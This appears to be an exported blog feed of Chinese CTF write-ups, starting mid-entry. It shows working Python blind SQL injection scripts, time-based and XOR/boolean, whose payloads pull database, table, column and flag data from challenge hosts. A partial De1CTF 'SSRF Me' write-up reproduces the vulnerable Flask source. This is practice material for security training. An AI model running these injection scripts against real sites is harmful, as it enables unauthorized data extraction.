punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1' or if (ascii (substr (database (),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"       #查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (table_name)) from (information_schema.tables) where (table_schema)='note'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload = f\"1'or if (ascii (substr ((seleCt (group_concat (column_name)) from (information_schema.columns) where (table_name)='users'),&#123;i&#125;,1))>&#123;mid&#125;,sleep (2),1)#\"        #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"1'or if(ascii(substr((seleCt(flag)from(fl4g)),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,sleep(2),1)#\"</span></span>       <span class=\"token comment\">#查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token string\">\"name\"</span><span class=\"token punctuation\">:</span>payload<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token string\">\"pass\"</span><span class=\"token punctuation\">:</span><span class=\"token string\">'qwer'</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span>        </pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        response <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data <span class=\"token operator\">=</span> data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>    </pre></td></tr><tr><td data-num=\"24\"></td><td><pre>            low <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            high <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>low <span class=\"token operator\">+</span> high<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span> </pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    <span class=\"token keyword\">if</span> low <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        flag <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>low<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"2通过get传参的脚本\"><a class=\"anchor\" href=\"#2通过get传参的脚本\">#</a> 2. 通过 get 传参的脚本</h1>\n<hr>\n<p>修改 url 和 文本</p>\n<h2 id=\"21-基于异或盲注布尔盲注等\"><a class=\"anchor\" href=\"#21-基于异或盲注布尔盲注等\">#</a> 2.1 基于异或盲注，布尔盲注等：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"1^(ascii(substr(database(),</span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>i<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">,1))></span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>mid<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">)#\"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (table_name)) from (information_schema.tables) where (table_schema)='geek'),&#123;i&#125;,1))>&#123;mid&#125;)#\"        #查表名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (column_name)) from (information_schema.columns) where (table_name)='F1naI1y'),&#123;i&#125;,1))>&#123;mid&#125;)#\"      #查列名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\"1^(ascii (substr ((select (group_concat (password)) from (F1naI1y)),&#123;i&#125;,1))>&#123;mid&#125;)#\"       #查数据</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">'ERROR'</span> <span class=\"token keyword\">in</span> response<span class=\"token punctuation\">.</span>text<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"22-基于时间盲注\"><a class=\"anchor\" href=\"#22-基于时间盲注\">#</a> 2.2 基于时间盲注：</h2>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> time </pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d98fb290-369c-4ad8-8cd5-883846041dad.node4.buuoj.cn/search.php?id=\"</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>name <span class=\"token operator\">=</span> <span class=\"token string\">''</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span><span class=\"token number\">1000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token builtin\">max</span> <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token builtin\">min</span><span class=\"token operator\">&lt;</span><span class=\"token builtin\">max</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">max</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>        payload<span class=\"token operator\">=</span><span class=\"token string-interpolation\"><span class=\"token string\">f\" \"</span></span>       <span class=\"token comment\">#查库名</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"        #查表名</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"      #查列名</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token comment\">#payload=f\" \"       #查数据</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        last <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        response<span class=\"token operator\">=</span>requests<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token operator\">+</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        now <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token keyword\">if</span> now <span class=\"token operator\">-</span> last <span class=\"token operator\">></span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>            <span class=\"token builtin\">min</span> <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token builtin\">max</span><span class=\"token operator\">=</span>mid</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">if</span> <span class=\"token builtin\">min</span> <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        name <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">min</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>name<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"3备注\"><a class=\"anchor\" href=\"#3备注\">#</a> 3. 备注</h1>\n<p>1.payload 不放了，这个做题慢慢积累，网上也都有，根据题目自己写</p>\n<p>2. 能不使用 sleep 就不使用，速度比其他的方法慢太多</p>\n<p>3. 在网不好的情况下可能会出现脚本打印的字符错误，不是代码问题</p>\n<p>4. 自己写的脚本可能不完善，有问题或者有建议留言，有需求也可以自改</p>\n<p>5. 遇到新的脚本或者方法再补充</p>\n<hr>\n<p>END</p>\n",
            "tags": [
                "sql"
            ]
        },
        {
            "id": "http://example.com/2021/08/16/ctf/web/http/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "url": "http://example.com/2021/08/16/ctf/web/http/(ctfwp)py%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/",
            "title": "(ctfwp)py代码审计",
            "date_published": "2021-08-16T12:35:41.221Z",
            "content_html": "<p>真服了，本来觉得代码审计真没啥考的，结果被 py 代码搞得头大，c</p>\n<p>我还是记录一下吧</p>\n<p><span id=\"more\"></span></p>\n<p>wp 大佬们都说简单，头真大，真搞心态，py 不行真是硬伤</p>\n<h1 id=\"1de1ctf-2019ssrf-me\"><a class=\"anchor\" href=\"#1de1ctf-2019ssrf-me\">#</a> 1.[De1CTF 2019]SSRF Me</h1>\n<hr>\n<p>说实话，ssrf 没咋考出来，全被代码审计坑了。。</p>\n<p>&lt;img src=&quot;<span class=\"exturl\" data-url=\"aHR0cHM6Ly9pLmxvbGkubmV0LzIwMjEvMDgvMTYvb3A4VmFHdVRYSDlSZ2NQLnBuZw==\">https://i.loli.net/2021/08/16/op8VaGuTXH9RgcP.png</span>&quot; alt=&quot;1.png&quot; style=&quot;zoom:50%;&quot; /&gt;&lt;!--p1--&gt;</p>\n<p>出个真是代码也不好好给，还得自己整理：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#! /usr/bin/env python</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># #encoding=utf-8</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> Flask</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">from</span> flask <span class=\"token keyword\">import</span> request</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">import</span> socket</pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">import</span> hashlib</pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">import</span> urllib</pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">import</span> os</pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> json</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token builtin\">reload</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>sys<span class=\"token punctuation\">.</span>setdefaultencoding<span class=\"token punctuation\">(</span><span class=\"token string\">'latin1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre> </pre></td></tr><tr><td data-num=\"14\"></td><td><pre>app <span class=\"token operator\">=</span> Flask<span class=\"token punctuation\">(</span>__name__<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre> </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>secert_key <span class=\"token operator\">=</span> os<span class=\"token punctuation\">.</span>urandom<span class=\"token punctuation\">(</span><span class=\"token number\">16</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre> </pre></td></tr><tr><td data-num=\"18\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Task</span><span class=\"token punctuation\">:</span> </pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">__init__</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">,</span> sign<span class=\"token punctuation\">,</span> ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        self<span class=\"token punctuation\">.</span>action <span class=\"token operator\">=</span> action</pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        self<span class=\"token punctuation\">.</span>param <span class=\"token operator\">=</span> param</pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        self<span class=\"token punctuation\">.</span>sign <span class=\"token operator\">=</span> sign</pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        self<span class=\"token punctuation\">.</span>sandbox <span class=\"token operator\">=</span> md5<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">not</span> os<span class=\"token punctuation\">.</span>path<span class=\"token punctuation\">.</span>exists<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            os<span class=\"token punctuation\">.</span>mkdir<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">)</span>          <span class=\"token comment\">#整个大类主要就是三个元素写的 action param sign</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre> </pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">Exec</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        result <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>        result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>checkSign<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t<span class=\"token comment\">#检查，然后如果有 scan，就把东西写到 result.txt</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"scan\"</span> <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">:</span>\t\t<span class=\"token comment\">#如果有 read，就读 result.txt；由此可知，俩都得有才行</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>                tmpfile <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./%s/result.txt\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">,</span> <span class=\"token string\">'w'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>                resp <span class=\"token operator\">=</span> scan<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>resp <span class=\"token operator\">==</span> <span class=\"token string\">\"Connection Timeout\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                    result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> resp</pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                    <span class=\"token keyword\">print</span> resp</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>                    tmpfile<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>resp<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>                    tmpfile<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"read\"</span> <span class=\"token keyword\">in</span> self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                f <span class=\"token operator\">=</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"./%s/result.txt\"</span> <span class=\"token operator\">%</span> self<span class=\"token punctuation\">.</span>sandbox<span class=\"token punctuation\">,</span> <span class=\"token string\">'r'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">200</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            <span class=\"token keyword\">if</span> result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token number\">500</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>                result<span class=\"token punctuation\">[</span><span class=\"token string\">'data'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Action Error\"</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            result<span class=\"token punctuation\">[</span><span class=\"token string\">'code'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token number\">500</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>            result<span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"Sign Error\"</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"51\"></td><td><pre> </pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">checkSign</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t<span class=\"token comment\">#检查可以看出是调用了 getsign，看是否和 sign 相等</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>getSign<span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">.</span>action<span class=\"token punctuation\">,</span> self<span class=\"token punctuation\">.</span>param<span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> self<span class=\"token punctuation\">.</span>sign<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>            <span class=\"token keyword\">return</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre> </pre></td></tr><tr><td data-num=\"58\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/geneSign\"</span><span class=\"token punctuation\">,</span> methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t\t\t<span class=\"token comment\">#路径之一，可以传参 param，让 action 默认成 scan</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">geneSign</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>    param <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>args<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"param\"</span><span class=\"token punctuation\">,</span> <span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>    action <span class=\"token operator\">=</span> <span class=\"token string\">\"scan\"</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre>    <span class=\"token keyword\">return</span> getSign<span class=\"token punctuation\">(</span>action<span class=\"token punctuation\">,</span> param<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre> </pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token decorator annotation punctuation\">@app<span class=\"token punctuation\">.</span>route</span><span class=\"token punctuation\">(</span><span class=\"token string\">'/De1ta'</span><span class=\"token punctuation\">,</span>methods<span class=\"token operator\">=</span><span class=\"token punctuation\">[</span><span class=\"token string\">'GET'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'POST'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\t\t\t\t\t\t<span class=\"token comment\">#路径之一，可以通过 cookie 传参 action 和 sign</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">challenge</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\t\t\t\t\t\t\t\t\t\t\t\t<span class=\"token comment\">#可以通过 get 传参 param，后面有个 waf 没啥用</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>    action <span class=\"token operator\">=</span> urllib<span class=\"token punctuation\">.</span>unquote<span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>cookies<span class=\"token punctuation\">.</span>get<span class=\"token punctuation\">(</span><span class=\"token string\">\"action\"</span><span class=\"token punctuation\">)</span><span class=\"token 